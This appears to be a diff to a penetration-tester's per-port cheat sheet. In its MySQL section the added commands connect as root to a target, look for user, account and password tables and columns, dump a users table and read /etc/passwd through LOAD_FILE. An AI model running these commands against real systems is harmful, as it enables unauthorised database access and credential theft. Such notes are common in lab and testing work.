@@ -609,7 +609,14 @@ setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
 
 [*] (3306) MySQL
 mysql -h localhost -u root --skip-ssl -e 'show databases;'
-mysql -h "$TARGET" -u root --skip-ssl -e 'show databases;use tikiwiki;show tables;select * from users_users\G;'
+mysql -h "$TARGET" -u root --skip-ssl -p -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'user'
+mysql -h "$TARGET" -u root --skip-ssl -p -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'account'
+mysql -h "$TARGET" -u root --skip-ssl -p -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'mail'
+mysql -h "$TARGET" -u root --skip-ssl -p -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'db'
+mysql -h "$TARGET" -u root --skip-ssl -p -e "SELECT table_schema,table_name,column_name FROM information_schema.columns" | grep 'passw'
+mysql -h "$TARGET" -u root --skip-ssl -p -e "USE db_name; SELECT * FROM users\G;"
+mysql -h "$TARGET" -u root --skip-ssl -p -e "SELECT @@version, @@hostname, user();"
+mysql -h "$TARGET" -u root --skip-ssl -p -e "SELECT LOAD_FILE('/etc/passwd')\G;"
 
 [*] (3389) RDP
 xfreerdp /v:'$TARGET' /d:'$DOM' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"
